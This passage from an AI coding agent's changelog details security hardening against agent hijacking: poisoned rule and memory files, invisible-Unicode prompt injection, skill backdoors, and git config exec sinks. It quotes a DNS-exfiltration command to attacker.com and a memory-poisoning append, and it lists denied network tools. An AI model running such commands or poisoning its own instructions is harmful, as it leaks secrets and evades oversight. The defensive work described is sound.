key).
- **the memory-eval suites drive the real post-swap dream again — with a no-LLM CI lane** — the Mem0 learning-core swap (25c6601) removed `dream.ts`'s `SYSTEM` export, silently breaking all four memory-eval runners (`quality-axes`, `poison-corpus`, `mpbench`, `recall-qa` imported it and measured a dead path). All four now drive the production pipeline: notes → quarantine scan → ONE platform `add()` (mem0 extraction, with the empty-extraction escalation active) → guard sweep → reconcile → render, over isolated per-scenario scopes in a per-suite scratch root (verified: mem0's SQLite vector store multiplexes payload-filtered scopes safely; `--dry` asserts no cross-scope leak). Each suite gained a `--dry` mode that exercises the full plumbing with verbatim `infer:false` adds — no LLM, no receipt writes, seconds fast — so CI can gate the harness shape between live campaigns; the corpus seed enters the platform exactly the way production seeds do. mpbench's note framing was reworded (the old phrasing structurally tripped the post-swap `propagation-instruction` scanner and would have quarantined the whole corpus). Classifier semantics are untouched: `quality-axes/selftest.mjs` passes all pins unchanged, and the deterministic matchers now consume `renderProjectMemoryMarkdown` output. Shared driver: `benchmarks/memory-eval/_lib/dream-pipeline.mjs`.

- **verify-first defaults — the project's own checks now run inside the agent loop** — the 2026-10 reverse-engineering survey of the popular coding agents and IDEs (Claude Code's gather → act → verify loop, aider's auto-lint/auto-test, Codex CLI, Gemini CLI, OpenCode, Cursor, Windsurf, Cline, Factory's AGENTS.md verification doctrine) ranked proactive verification as the single highest-evidence quality default, and Unown shipped none of it. Five surfaces changed together: (1) **the base system prompt** (vendored pi core) now carries the verify-first doctrine — read a file before editing it; keep changes minimal; plan multi-step work; never weaken, skip or delete tests; verify by running the project's checks before declaring work done; never report success while a check is failing (the last two gated on a shell tool being active) — on every session, subagent and plan-mode run, and the `edit`/`write` tool guidelines gained the matching after-the-edit rule. (2) **the PostToolUse auto-verify gate** (`src/verify.ts`, wired next to the LSP diagnostics loop in `tools.ts`): after every `write`/`edit` of a non-doc file, run the project's OWN check command — package.json scripts (`typecheck`, else `lint`) through the detected package manager, `Makefile` targets, or pyproject tool sections — and feed failures back into the tool result as an error, so a broken edit is a FAILED edit the model immediately fixes (aider's auto-lint semantics; silent on pass; 20 s cooldown; 120 s timeout; 4 000-char tail-biased output clip; fail-open on every path; commands pass the same bash-policy denylist the bash tool answers to; one command-not-found disables the gate for the session). The TEST lane is opt-in (`UNOWN_AUTO_TEST=1`, aider's `--auto-test` precedent — test suites can mutate state and hit the network); `UNOWN_AUTO_VERIFY=0` disables the whole gate. (3) **dedicated search tools are default-active** (`src/session-tools.ts`): sessions start with pi's base four plus `grep`/`find`/`ls` when their binaries answer on PATH (`ls` is pure JS and always on; ripgrep/fd — or Debian's `fdfind` — detection avoids pi's download-on-first-use surprise) — the default every major agent ships; a configured settings `defaultTools` or an explicit `--tools` list still wins, via a new non-restrictive `defaultTools` session option (a DEFAULT set, not the `tools` allowlist — extension tools keep registering). (4) **the Tier-0 policy seed** gained the verify-first pair (read-before-edit; never report success with a failing check) on both the terminal and engine sides, the file is seeded on first use exactly like the user tier (the documented ops override point is discoverable on disk), and a pristine-seed refresh upgrades pre-2026-10 installs without ever touching an edited policy. (5) **compaction and branch summaries carry verification state**: an unverified change summarizes as In Progress, not Done. `unown init` / `/init-agents` additionally emits a **Verification section** — the exact typecheck/lint/test commands with the never-weaken rule (Factory's doctrine). Pinned by `test/verify.test.ts` (39 tests: detection, gate state machine, feedback formatting, runner lanes, policy-seed refresh), `test/session-tools.test.ts` (7), the coding-agent system-prompt doctrine tests, and the init-agents Verification tests; verified live end-to-end against a real model (a deliberately broken edit came back as `[auto-verify] npm run typecheck failed (exit 1)` with the parse error quoted, the edit marked isError, and the agent acknowledging the failure in its reply).
- **First flights — the guided first task inside the TUI** — the 0.0.3 wizard ended with a paste-in catalog, but a fresh `unown` session still dropped you into an empty editor to think of something to type. The interactive session now opens with the same four starter tasks as an in-TUI catalog card in the editor slot (`1`–`4` or ↑↓+Enter pick, `Esc` closes for this session, `x` stops the auto-show for good): the picked prompt is pre-filled into the editor — press Enter to send or edit it first — and a footer hint says exactly that until the first real message clears it. The card shows only until the user's first REAL interactive message: the latch is `<UNOWN_HOME>/onboarding.json` (schema 1, atomic temp+rename writes, null-on-corrupt reads — the catalog itself never latches, so `Esc` brings it back next session while a sent flight or any typed message retires it). `/flights` reopens the catalog any time, and `unown "a prompt"` never shows it — the positional prompt becomes the TUI's `initialMessage` and is itself the first task. The catalog data is one source of truth with the setup summary (`src/flights-core.ts` — the wizard's closing lines stay byte-identical, pinned by tests), the card is a custom pi-tui component mounted through the extension seam (`ctx.ui.custom` — zero edits to the vendored InteractiveMode), and the whole flow is pinned by 38 new unit tests plus a six-scenario PTY verification (gate → wizard → card → digit pick → prefill → send → live reply → latch; relaunch without the card; `/flights` reopen; never-again; Esc-returns-next-session; initialMessage suppression). Docs: quickstart, usage, README.
- **the post-first-task onboarding tips — "You're flying" + four one-time session tips** — the catalog ends the cold start, but the minute after the first reply is where onboarding actually lands. When the first-ever task's run fully settles (`agent_settled`), one transcript line marks the moment — `You're flying — the first task is done. /flights has more starters · /help lists everything · ctrl+k searches commands.` — and every later session boots with one quiet tip the user hasn't seen (`/undo`+`/checkpoint`, the `ctrl+k` palette, `/plan`'s approve-before-execute, project memory), in order, until all four are spent; then onboarding stays silent forever. Tips latch their id in the same `<UNOWN_HOME>/onboarding.json` (`tipsSeen`), render as in-transcript status lines via `ctx.ui.notify` (never dialogs, never LLM context, never blocking), fire at most once per boot (a boot that shows the catalog never also shows a tip), and the `initialMessage` lane skips the session tips — that message is mid-task from t=0 and earns the flying tip itself. The flying tip fires only in the process that WATCHED the first-ever latch happen (a `firstTaskAt` left over from an earlier session never re-triggers it). Pinned by 12 new tests (fake-pi: flying-tip timing incl. pre-existing-latch exclusion and double-settle no-op; the four-boot tip sequence in order; exhaustion; autoShow/non-TUI suppression; pure-helper byte pins) plus a five-run PTY pass (fresh journey → flying line after the reply settles → `tipsSeen=[flying]`; four relaunches → exactly one tip each, in order, no catalog; fifth relaunch → silence, all five ids latched).

### Agent Behavior (guard precision + canary verify-twice, 2026-10-23)

- **the dream guard stops flagging its own product's grammar** — two precision fixes to `guard.ts`, both found live in the 2026-10-23 real-user benchtest, both keeping 10/10 adversarial poison-corpus coverage (verified; the split-note attack's second half included): (1) the note-level **propagation scanner is verb-gated** — "Noted for future sessions", "will be remembered in future sessions" and "applies to future sessions" are the assistant's natural acknowledgments and the user's natural memory requests, not attacks; the scanner now requires an instruction shape (an imperative with a direct object, a consequence clause, a persistence verb within a sentence of the future/all-sessions target, or instruction-shaped prominence) — every corpus attack pairs the phrase with exactly that. (2) the line-level **runner-directive conjunction is clause-aware** — a runner word and switch-language must sit in the SAME semicolon-delimited clause, so a multi-subject preference line ("test runner is vitest; deploy target is Fly.io; code style disallows semicolons") is no longer a runner switch; the corpus's parenthetical and dash-separated poison shapes deliberately stay inside one clause. Net effect, measured live: a benign preferences session dreams into real memories and the next session recalls them, while the corpus coverage is unchanged. Pinned by `test/guard.test.ts` (descriptive-acknowledgment matrix, verb-gated instruction shapes, descriptive-vs-instruction prominence, clause-aware benign/attack pairs) and `benchmarks/memory-eval/poison-corpus/` re-run through the guard.
- **the dream canary holds itself to the harness's verify-twice standard** — a FAILED canary re-runs once before the dream rolls back: two failures gate (deterministic evidence against the new memory), failure + pass records a flaky reference and the dream proceeds (measured live: a hard minted task with a ~50% pass rate was gating every other dream on upstream variance), failure + infrastructure-error gates conservatively. Tool-drift and claim-mismatch analysis are exempt — they read the run's transcript, not its luck. The canary failure reason now says "failed twice under new memory vN (verify-twice)". Pinned by `test/canary.test.ts` (both-fail, flaky-pass, confirm-error cases) + live receipts in the dream log.

### Agent Behavior (verify-first defaults, 2026-10-22)

- **every session now starts verify-first** — the system prompt carries the quality doctrine above; `grep`/`find`/`ls` are default-active when their binaries are on PATH (settings `defaultTools` and `--tools` still win); after every write/edit of a non-doc file the project's own check command runs (typecheck, else lint) and a failure marks the tool result as an error; the Tier-0 policy seed (now seeded on first use, pristine-refreshable) carries read-before-edit and never-report-success-with-a-failing-check; the `general` subagent's contract requires quoting check verdicts; compaction preserves verification state. Kill switches: `UNOWN_AUTO_VERIFY=0` (gate), `UNOWN_AUTO_TEST=1` (opt-in test lane). The behavior card: [docs/BEHAVIOR.md](docs/BEHAVIOR.md).

### Fixed

- **the upstream pi credit now points where the repo lives** — `badlogic/pi-mono` moved to `earendil-works/pi` (the old URL 301-redirects); the README hero + credits, the root and CONTRIBUTING DOX lines, the self-learning README and the landing footer's "Built on the pi coding agent" link all carry the current URL (Mario Zechner's authorship credit unchanged; the vendored tree's own historical changelog links stay as written — they are dated records).

### Agent Behavior (edit-reliability transparency, 2026-10-22)

- **the edit tool now tells the model when its oldText was not byte-exact** — the edit ladder (exact → whitespace/Unicode-tolerant matching, unchanged lines preserved byte-for-byte) already existed in the vendored core, but the fallback was invisible: a fuzzy-applied edit reported plain success, so the model kept emitting drifted oldText. The applied-edits result now reports `usedFuzzyMatch` plus per-edit `fuzzyEditIndices`, and the tool result appends a note ("the match required whitespace/Unicode normalization; copy the text exactly (including whitespace) for precise edits") — the model self-corrects toward byte-exact oldText, and the receipts ledger records the signal as an observable edit-reliability metric (aider tracks "% correct edit format" on its leaderboard for exactly this reason; same-model scores swing ~11 points with edit-format reliability). Pinned by `test/edit-reliability.test.ts` (6 tests: fuzzy reporting by index, mixed exact+fuzzy, Unicode punctuation drift, and the end-to-end tool-result note through injected operations).

### Changed

- **the standalone CLI binary is now the default install; `--source` is the full stack** — `curl … install.sh | sh` and `irm … install.ps1 | iex` used to clone the repo and build the whole stack; with no flag they now download the release marked latest, verify its SHA-256 and install the terminal agent under a versioned root with a PATH shim — no git, no bun. The full stack (engine + llm-bridge + learning loop) moved behind `--source` / `-Source`; `--main`/`-Main` and `--dest`/`-Dest` imply the source lane, and `--binary`/`-Binary` remains an explicit spelling of the default. A bare run on a machine whose `install.json` records the other mode is refused and the error names the flag that keeps it, so an existing checkout is never silently replaced. The landing hero follows in the same change: its `then:` chain is `unown setup → unown · CLI only`, and the relabelled `source` expander carries the full-stack sequence plus the `--source` one-liners. The release workflow's `smoke-install` matrix now installs with no mode flag (the visitor's command) and asserts the published scripts advertise the source lane. Docs: install, quickstart, windows, macos, README.

### Agent Behavior (binary-default onboarding — no bridge claim on a machine that has none, 2026-10-22)

- **the first-run gate and banner no longer promise a bundled bridge the install does not ship** — the standalone binary is now the default install and carries no llm-bridge, but a fresh `~/.unown` seeds the loopback bridge provider, so the gate offered `n = keep the bundled bridge for now` and the banner said `using the bundled llm-bridge` even when nothing answered at `:3031`. The gate now probes `/health` (1 s) before offering that option; when it is down the decline is `n = skip for now (no provider connected)` and the banner says no model endpoint is answering and names `unown setup`. A source install with the bridge up is unchanged. `firstRunGateLines()` / `firstRunBannerLines()` are pure and pinned by `test/first-run-copy.test.ts` (bridge-up, bridge-down, direct-provider).

### Added (October 2026 hardening — the instruction-set integrity gates, 2026-10-22)

- **instruction-set write policy — the agent can no longer write its own rule files** — the instruction set (every file the agent loads as behavior) was the one surface no machine gate owned: the write jail confined *where* an in-session write may land, but writing `AGENTS.md` or `.unown/hooks.json` was a legal in-project write. That is the persistence vector of a hijacked agent — one poisoned rule file outlives the session that wrote it and steers every future one (AutoRedClaw arXiv:2610.27244; Agent Commander's promptware C2, embracethered.com; the "Fable to Haiku" subagent-config downgrade chain; the October 2026 Tensorlake dropper, which writes `.claude/settings.json` and `.vscode/tasks.json` for persistence on project open). New pure module `pi-repo/packages/self-learning/src/instruction-guard.ts` (`instructionWriteDeny`): in-session `write`/`edit` calls — and bash redirect targets, checked before the `/tmp` exemption in `bashRedirectEscape` — resolving to `AGENTS.md`/`CLAUDE.md` (any depth), `.unown/skills/**`, `.unown/agents/**`, `.unown/hooks.json`, `.unown/permissions.json`, `.unown/memory/policy*`, `.unown/adversary.md`, `.claude/settings.json`, `.claude/agents/**`, `.vscode/{tasks,settings}.json` are **denied, verdict final, before the declarative permissions layer** (an `allow` rule cannot unlock them — the same contract the jail has), in terminal sessions (`termhooks.ts`) and engine runs (`hooks.ts`, against the sandbox root and the real project dir). The deny message names the fix: propose changes via a PR for human review. Symlinks are resolved through the jail's realpath-ancestor idiom (`ln -s .unown l && write l/hooks.json` matches); matching is case-insensitive (Windows/macOS resolve case-variants to the same file; on Linux the residual over-block is documentation cost only — fail-closed is the mandated direction). Deliberately excluded: `.unown/skills-staged/**` (the minter's staging dir, never auto-loaded) and `.unown/memory/project.md` (AutoDream's dream target — the *engine* process writes it, never the tool gate; the policy tier above it *is* denied). Pinned by `test/instruction-guard.test.ts` (60 tests) and the termhooks suites (221 + 69).
- **invisible-Unicode lint over the instruction set — CI, pre-commit, and `unown doctor-instructions`** — an instruction file enters model context verbatim, so an invisible code point inside one is a prompt-injection payload no human reviewer can see but the model reads as text (Embrace the Red's "Scary Agent Skills" — the Unicode-Tag-behind-emoji backdoor; "Sneaky Bits"; Trojan Source, arXiv:2111.00197). `scripts/check_instruction_chars.mjs` (zero-dep, node+bun, cross-platform) scans 7 char classes — bidi controls U+202A–202E, bidi isolates U+2066–2069, zero-width U+200B–200D/U+2060/U+FEFF, soft hyphen U+00AD, invisible operators U+2061–2064, Unicode Tags U+E0000–E007F, variation-selector runs (FE+MVS mixed, threshold 3) — over every instruction file in the working tree: AGENTS.md/SKILL.md/CLAUDE.md at any depth, `.unown/**`, hook configs, subagent definitions. Findings print file:line:col + U+XXXX + a hex-escaped excerpt (the payload is never echoed raw — echoing it *is* the attack); the fail-closed posture runs through the whole gate: unreadable file = finding, unknown allowlist rule = config error exit 2, stale exemptions warned. Wired three ways: the `instruction-chars` CI job (`.github/workflows/ci.yml`, runs the scan + the scanner's own 21 unit tests so the gate cannot rot into a no-op), `.pre-commit-config.yaml` (gitleaks v8.30.1 — latest release, verified against the redirect target — plus the local `instruction-chars` staged-file hook; CI remains the authority), and the runtime twin: `unown doctor-instructions` gained an eighth section, **Unicode integrity** (`scanInstructionText` in instruction-guard.ts — the same 7 classes reimplemented inline because the package vendors standalone; the staged skills tree is scanned too: instruction-shaped content about to be promoted). The repo's own instruction set scanned clean at adoption (39 files, 0 findings, nothing allowlisted away). Pinned by `scripts/check_instruction_chars.test.mjs` (21 tests) and `test/doctor-instructions.test.ts` (24).
- **CODEOWNERS + branch protection on `main` — instruction files and guard sources are review-gated** — instruction files *read* like documentation but execute as behavior, so a merged poison edit needed only a push. `.github/CODEOWNERS` puts the instruction set (root + every vendored copy, skills, agent definitions, hook/permission configs), the guard/gate sources (`bash-policy.ts`, `instruction-guard.ts`, `guard.ts`, `shield.ts`, `permissions.ts`, `hooks.ts`, `termhooks.ts`, `injection-scanner.ts`, `config-trust.ts`), and the security tooling itself (lint gates, CI workflows, `.gitleaks.toml`, `.pre-commit-config.yaml`) under owner review on every PR, and `main` now runs with branch protection: PR + CODEOWNERS review + the 7 required CI checks + linear history + no force push (admins exempted — the documented solo-maintainer milestone lane; the review *gate* is the point, not the identity). GitHub secret scanning + push protection are confirmed enabled on the repo.
- **`UNOWN_SANDBOX_REQUIRED` — the fail-closed sandbox knob** — the historical contract was open-fallback: a host whose OS sandbox is unavailable silently degraded engine runs to the in-process path jail — auditable after the fact via the run's isolation row, never refused. Operators who need the isolation guarantee (untrusted curriculum, hostile-network hosts, compliance) can now make the degrade impossible: `UNOWN_SANDBOX_REQUIRED=1` (or `true`, call-time env read; documented in `.env.example` next to the other sandbox knobs) makes the two engine-run degrade points — `sandbox.ts` `execInSandbox` (verify/exec) and `runner.ts` `runAgent` (the agent bash tool's shell) — throw the typed `SandboxRequiredError` instead. The message is actionable: it names the backend this platform was expected to provide, the `UNOWN_OS_SANDBOX=0` kill-switch clash when that is what disabled it, and the native-Windows story (kernel-grade isolation does not exist there — use WSL2 or unset the knob; Windows fails identically by construction). The refusal lands in `runAgent`'s catch as a typed `status:'error'` run row and the router's job error path — loud, typed, auditable. This is the Unown spelling of Claude Code's documented sandboxing `failIfUnavailable`. Default (unset/`0`): zero behavior change. Pinned by `test/bwrap.test.ts` (42: parse quirks, the pure `decideSandboxFallback` decision table, the typed error, the kill-switch-clash message, the guard composition) and `test/sandbox-jail.test.ts` (integration: default degrades unchanged; armed refuses).

### Agent Behavior (October 2026 hardening — the in-session denials, 2026-10-22)

- **every session now denies instruction-set writes; sandbox and strict modes deny the DNS-exfiltration family; mutated tool input is re-checked** — three guard-rule changes, one theme: the deny decisions moved below what an allowlist can excuse. (1) **The instruction-set write gate** (see the Added entry) is behavior in every mode — terminal and engine, default and strict; the agent sees `instruction-set file is not writable in-session: … (propose changes via a PR for human review)` and the change surface for rule files becomes the PR. (2) **DNS exfiltration** (CVE-2025-55284 — Claude Code's bash allowlist carried ping/nslookup and `nslookup $(cat .env).attacker.com` leaked secrets in subdomain labels): `ping`/`ping6`/`nslookup`/`dig`/`host` — plus the PowerShell twins `Test-Connection`/`Resolve-DnsName` — are denied in `bash-policy.ts` `BASH_DENY` (engine sandbox + strict terminals, mirrored in `termhooks.ts` `STRICT_EXTRA_DENY`) when they name an external target (URL, IPv4 literal, or domain — a 3-label arm catches single-letter-label probes); loopback (`127.0.0.1`/`localhost`/`::1`) and bare targetless invocations stay allowed. Why a separate rule when the network rule exists: DNS tools never open a socket the network rule can see — the resolution *is* the channel, leaving via the host's stub resolver as a subdomain-encoded label. These commands must never be allowlisted. The accepted over-block (word + dotted pair in one segment, e.g. `grep ping config.yaml`) is the documented fail-closed direction the shipped network rule already takes for its words. (3) **TOCTOU re-check**: a user `PreToolUse` hook with `decision: "mutate"` used to execute its rewritten input having passed nothing — the permission gate (and the human behind its ask rules) approved the *original* input. The full built-in gate stack (deny-list + redirect resolution; jail + instruction-set guard) and the permissions layer now re-run on the mutated input before it is applied; a failure denies with `mutated tool input failed policy re-check: …`, and a mutation that trips an `ask` rule is denied too (the approval covered the original input only — the agent can re-issue the mutated-shaped call through the normal ask flow). What you approve is what runs (the TOCTOU class Embrace the Red documented for agent approvals in 2026). The behavior card: [docs/BEHAVIOR.md](docs/BEHAVIOR.md); the permissions contract: [docs/permissions.md](docs/permissions.md). Pinned by `test/termhooks.test.ts` (221) and `test/termhooks.windows.test.ts` (69).

### Agent Behavior (October 2026 hardening — staged skill minting, 2026-10-22)

- **AutoDream mints new skills into `.unown/skills-staged/` — promotion into `.unown/skills/` is a human `mv`** — minted skills are model-authored instruction content: the description rides every future session's system prompt and the body injects on demand, yet the minter wrote straight into the loaded tree, making the self-improvement loop its own persistence vector (the backdoored-skills class — Embrace the Red's "Scary Agent Skills"; ClawHavoc's 341-malicious-skills report; AutoRedClaw arXiv:2610.27244). The minter (`skills.ts`) now writes `.unown/skills-staged/<name>/SKILL.md` — a sibling the discovery root never loads (skill discovery reads exactly `.unown/skills/`) — with `staged: true` frontmatter, the staging recorded in the skill-version note and the mint log line, and a promotion README written into `skills-staged/` on the first mint (never clobbered: a human may edit it). Promotion is deliberately a human hand: `mv .unown/skills-staged/<name> .unown/skills/<name>`. User-authored skills in `.unown/skills/` load exactly as before; dedup counts the staged tree so a re-dream cannot overwrite a staged skill awaiting review; retirement removes a skill's directory from wherever it lives. The in-session write gate (above) makes `.unown/skills/**` agent-unwritable, so staging is the engine's own channel and review is the only path into the prompt. Pinned by `test/skills.test.ts` (41).

### Agent Behavior (memory-lane hardening — the Manual-notes persistence channel, 2026-10-22 v2)

- **`.unown/memory/project.md` and its provenance sidecar are not writable in-session; a preserved Manual-notes lane is never vouched for as AutoDream-written; the dream's sanitize verdict actually sanitizes; harness telemetry never reaches the quarantine scan or the extractor** — four changes, one surface: tier-1 project memory, injected into every future session's system prompt. The owner's Manual-notes lane (0d1a50e) made the file durable-by-preservation — whatever sits under `## Manual notes` survives every dream verbatim — which inverted the original exclusion rationale for `project.md` (dreams used to re-render from platform state, clobbering agent-written text; now they preserve it), turning an in-session write into a persistent prompt-injection channel whose content the next dream *launders*: the dream writes the file, the sidecar's whole-file sha matches, and the injection framing reads “written by AutoDream vN; content matches” for text AutoDream never authored — the exact class arXiv:2607.29167 (*Memory Provenance Laundering in LLM Agents*) formalizes and OWASP's agentic Top 10 ranks as ASI06 (Memory & Context Poisoning). (1) **The deny**: both files joined `INSTRUCTION_WRITE_DENY` (write/edit tools, bash redirects and appends — `echo poison >> .unown/memory/project.md` is denied), with the lane's own remediation message (“memory is engine-written — add Manual notes by editing the file outside a session; dreams preserve them verbatim”) instead of the PR path; the engine (dream.ts) writes both directly and never through the tool gate, and user hand-edits outside sessions keep surviving dreams verbatim — the lane's documented contract, unchanged for its intended user. (2) **Provenance v2**: the sidecar records the sha256 of the preserved Manual-notes section plus a sticky `manualEdited` flag — the section sha detects a hand-edit between dreams (the whole-file sha cannot: the dream re-appends the section, so its write always matches its own sidecar), the flag is sticky so the framing can never regress, and once set the injection line reads “platform sections written by AutoDream vN … ; Manual notes section hand-edited, unverified”. Fail-closed everywhere: a malformed v2 field makes the whole sidecar untrusted (never-written framing), unknown-origin sections count as edited, and the seed's own instructional bullet is exempt (repo-shipped scaffolding, trusted like AGENTS.md — a pristine-seed dream keeps the plain framing). (3) **The sanitize verdict is no longer decorative**: the version row, the file write AND the sidecar all record `guard.sanitized` when the dream's guard sweep flags lines (previously all three recorded the unsanitized render — flagged lines, including preserved Manual-notes lines, actually shipped). (4) **Harness telemetry is stripped deterministically**: the session-metadata line (“never extractable … (bash, write, edit) … session <salt>”) is removed before the quarantine scan and before the extraction input — the guard's runner+directive conjunction had read it as a runner directive and quarantined EVERY bash-using session's note wholesale since the salt fix made the line universal (memory extraction silently dead for real sessions; the deterministic strip existed only on the reframe retry path), and the salt never reaches the extraction LLM. (The same-day benchtest campaign independently found the same zeroed learning loop and landed a complementary guard layer-0 — harness scaffolding dropped before the language rules, immune to any label spelling — plus a label rephrase; this strip matches ANY “Session metadata (” spelling and uniquely guards the EXTRACTION input, which layer-0 does not. Both layers are pinned.) The behavior card: [docs/BEHAVIOR.md](docs/BEHAVIOR.md); the contract: [docs/permissions.md](docs/permissions.md). Pinned by `test/instruction-guard.test.ts` (66) and `test/manual-notes.test.ts` (26 — the laundering-kill end-to-end: hand-edit → dream → sidecar flag → honest framing, sticky across a second dream; the pristine-seed clean case; the malformed-sidecar fail-closed case; the bash-session quarantine fix, pinned against `buildTerminalNote` output).

### Fixed (memory-lane edge cases + the windows CI leg, 2026-10-22)

- **the Manual-notes parser is line-anchored and capped; `/learning` shows file ages again; the subagent fallback chain no longer references an unimported symbol** — the extractor used bare `indexOf`, so a bullet *containing* “## Manual notes” mid-line captured the section and silently dropped the user's real manual notes, `### Manual notes` and trailing-space spellings matched, and a mid-line forged `<!-- unown: rendered` comment truncated preservation; the heading must now be exactly h2 at line start, the end boundary is the next line-start h2 or the line-start footer, CRLF-safe, and the preserved section is capped at 4k chars with a visible `<!-- unown: manual notes over cap -->` marker (an unbounded lane was a budget-eating, dream-render-cap-breaking wedge). `/learning`'s per-tier “updated Xm ago” line silently vanished: the budgeted-files map dropped `fsPath` (also a type error) — it rides again, with the inline guide carrying `""`. `tools.ts` referenced `isModelUnhealthy` without importing it — a latent `ReferenceError` on the subagent fallback-chain path — now imported. Plus three owner-side type errors fixed (`preserveManualNotesFrom` missing from the render opts type; `BudgetFile.fsPath`). Pinned by `test/manual-notes.test.ts` (parser hard cases, cap, fsPath) and `test/budget.test.ts`.
- **the windows CI leg is green-shaped again (11 pre-existing failures triaged to root causes, across two rounds)** — the leg had never actually completed before (cancelled at the prior milestone), so the 2026-10-22 run exposed stock bugs: `fakeBinDir` created extensionless fake binaries while `whichBinary` probes PATHEXT extensions on win32 — every “binary present” assertion was unresolvable there (`.exe` twins are written now); recursive `rmSync` cleanups threw EBUSY right after `db.close()`/`winner.kill()` while the OS still held handles — the losing-engine and sqlite-shim tests failed with green assertions (now best-effort cleanups: retries first, then swallow — a leftover temp dir in the OS tmpdir must never fail a green test; bun's rmSync retry support is unverified, 1s of retries did not clear it on the leg); the staged-tree sibling test hard-coded `/` prefixes that break under win32 `join()` backslashes (separator-agnostic now); the ComSpec fallback probe passed `undefined` — which triggers the parameter DEFAULT (`process.env.ComSpec`, set on every real windows host), so the fallback was only ever tested on linux (probed with `""` now, the env default asserted tolerantly); and the two genuinely slow tests (git + 500 file writes; the legacy-jobs migration) get explicit 20s timeouts matching the file's own slow-test convention. No production code changed — every fix is test infrastructure, verified green on Linux.

### Fixed (engine: composite tier keys materialize to Windows-legal filenames, 2026-10-22)

- **`project:<slug>` memory tiers crashed the engine on Windows with EINVAL** — `tierPath()` derived the materialized file as `data/memory/project:<slug>.md`, and `:` is illegal in Windows filenames (reserved for drives/NTFS streams): the atomic rename failed the moment the engine materialized a composite tier — found live by the first windows CI leg that ever ran the integration suite (the main suite's 11 stock failures had always masked it before). Tier file names now percent-encode every character outside `[A-Za-z0-9._-]` (`project%3Ait-api-1a2b3c.md`): reversible, collision-free (percent never occurs in a slug — slugifyPath collapses to `[a-z0-9-]`), and a no-op for the four classic tiers, so POSIX files for policy/project/user/local are byte-identical to before. The DB tier KEYS are untouched (the version-history schema and every query stay on `project:<slug>`); previously-materialized composite files on POSIX become orphaned derived artifacts, re-healed at the new spelling by readTier's version-authoritative self-heal. Pinned by `test/harness-guard.test.ts` (classic-spelling identity, Windows-legality of every segment, and the `project:foo` vs `project-foo` collision case).

### Changed (unicode lint + doctor scope — nested `.unown` trees and the injected memory tier, 2026-10-22 v2)

- **the invisible-Unicode lint discovers `.unown/` at ANY depth; the doctor scans the memory tier; CODEOWNERS covers the nested tree and the memory-lane guard sources** — the vendored `pi-repo/packages/self-learning/.unown/` seed-memory tree (committed by the owner the same day) is tier-1 instruction surface exactly like the root one when the package dir is the working project, but the lint's discovery was root-anchored (`relPosix.startsWith(".unown/")`) and the doctor's unicode leg stopped at skills/agents/hooks — both now cover it (the lint via any-depth `.unown/` matching with the runtime-dir exclusions intact, pinned by two new scanner tests; the doctor via `.unown/memory/*.{md,json}` — project.md/policy*/local.md ride every session's injection stack, three new doctor tests). The repo's own instruction set scans clean at the widened scope: 40 files, 0 findings. CODEOWNERS gained `**/.unown/` and the memory-lane guard sources (`dream.ts`/`term.ts`/`memzero.ts` — they carry the manual-notes sweep, the provenance framing and the quarantine strip); the package's own `.unown/.gitignore` now mirrors the root's runtime-state entries so dogfooding receipts/checkpoints/reviews/fleet and the provenance sidecar can never be committed by accident.

### Changed (October 2026 hardening — every git invocation neutralizes the GitSpawn exec sinks, 2026-10-22)

- **read-only git probes run with the full GitSpawn hardening set; `git add`/`commit` keep user hooks but close the exec sinks** — GitSpawn (September 2026, shattered.io — 7 coding agents affected, 4 unpatched at disclosure) showed a repo-local `.git/config` executes attacker code the moment an agent runs background `git status`/`git diff`/`git rev-parse` in a cloned repo — outside any sandbox, before any approval prompt — and disabling hooks is not enough: git config carries other program-execution sinks. `gittools.ts` is now the single source of truth for the arg sets: `readOnlyGitArgs()` = empty `core.hooksPath` (private per-process mkdtemp dir) + `--no-optional-locks` + `core.fsmonitor=false` (the primary sink — git spawns the configured helper on status/add/commit/checkout/reset/merge, verified on git 2.47) + `core.sshCommand=ssh` (executes on any remote-touching op; reset to the documented default, not empty — empty errors) + `core.askPass=` + `core.pager=` (empty values disable the programs while terminal fallback keeps working); `mutationGitArgs()` = fsmonitor + sshCommand only — user hooks deliberately stay live on the commit path (the documented husky/lint-staged contract: a failing hook surfaces as a typed failure), because user hooks are a reviewed gate while fsmonitor is an unreviewed exec sink no legitimate workflow depends on. `core.fsmonitorHookVersion` is deliberately NOT neutralized (both its code paths are dead under `core.fsmonitor=false` and an empty value may be a hard config error on git 2.36–2.40). Applied across every call site — `gittools.ts` (`runGit` + the new sync `runGitSync`), `worktree.ts`, `info.ts`, `uninstall.ts`, `update.ts` (verb-bucketed, fail-closed to the mutation set on an unknown verb) and the doctor's `check-ignore` probe (`doctor-instructions.ts`, which keeps its no-imports discipline by replicating the idiom). Pinned by `test/gittools.test.ts` (39, including the booby-trapped-`.git/config` regression: a repo whose `core.fsmonitor` points at a script that touches a marker file must never run it) and the per-call-site suites (`worktree`/`info`/`uninstall`/`update`: 84).

### Removed (October 2026 hardening — one lockfile, 2026-10-22)

- **the root `package-lock.json` is gone — `bun.lock` is the single source of truth** — two committed lockfiles is a supply-chain ambiguity (installers and CI drift between them, and `bun install --frozen-lockfile` never reads the npm one). The repo runs on bun; the root `package-lock.json` is deleted and `bun install --frozen-lockfile` verified clean against `bun.lock` ("Checked 412 installs (no changes)"). `benchmarks/nonllm/package-lock.json` stays — a deliberate pin inside that fixture's own npm flow. No workflow, doc or AGENTS.md referenced the removed file.

### Changed (the landing page — the feature carousel, 2026-10-22)

- **the split-view band is now the feature carousel** — band five plays every feature's own capture instead of demoing one display mode: the nine TUI-capture scenario videos (fix loop, plan mode, checkpoints, overlays, review, subagent, fleet, wiki, doctor CLI) plus split view's audited stills, each with the writeup style the split band had, and five features with no capture yet (goals, routines, MCP, web search, skills) as honest empty stages pointing at their docs. No new capture was made for it — placeholders stay placeholders.
